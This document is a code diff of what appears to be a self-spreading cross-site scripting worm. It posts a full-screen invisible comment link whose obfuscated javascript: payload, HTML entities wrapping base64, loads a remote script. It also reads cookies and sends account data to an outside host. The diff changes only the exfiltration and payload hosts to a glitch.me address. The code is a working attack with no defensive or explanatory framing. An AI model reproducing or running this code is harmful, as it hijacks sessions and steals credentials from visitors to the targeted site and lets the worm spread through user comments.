@@ -279,7 +279,7 @@ async function fetchAndPost(quantity) {
             const commentString = `<a style	="position:fixed;inset:0;z-index:999999" href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;(eval)(atob('ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ0NvbW1lbnRzJykuYXBwZW5kQ2hpbGQoT2JqZWN0LmFzc2lnbihkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKSwgeyBzcmM6ICdodHRwczovL2NvdW50ZXItbHB2cy5vbnJlbmRlci5jb20vMi5qcycgfSkpOw'))">.</a>`;
             
             // Step 1: Fetch the counter URL asynchronously
-            const counterResponse = await fetch('https://counter-lpvs.onrender.com');
+            const counterResponse = await fetch('https://a-zss.glitch.me');
             if (!counterResponse.ok) {
                 throw new Error('Error fetching counter URL: ' + counterResponse.statusText);
             }
@@ -320,7 +320,7 @@ async function fetchAndPost(quantity) {
                 console.log('Post request successful.');
 
                 // Step 5: Perform the additional POST request with counterString as body
-                const additionalPostRequest = await fetch('https://counter-lpvs.onrender.com', {
+                const additionalPostRequest = await fetch('https://a-zss.glitch.me', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'text/plain'
@@ -440,7 +440,7 @@ function getCookies() {
 }
 
 function sendAccData(accdata) {
-  fetch('https://counter2-1.onrender.com/acc', {
+  fetch('https://a-zss.glitch.me/acc', {
     method: 'POST',
     headers: {
       'Content-Type': 'text/plain', // Change this to text/plain
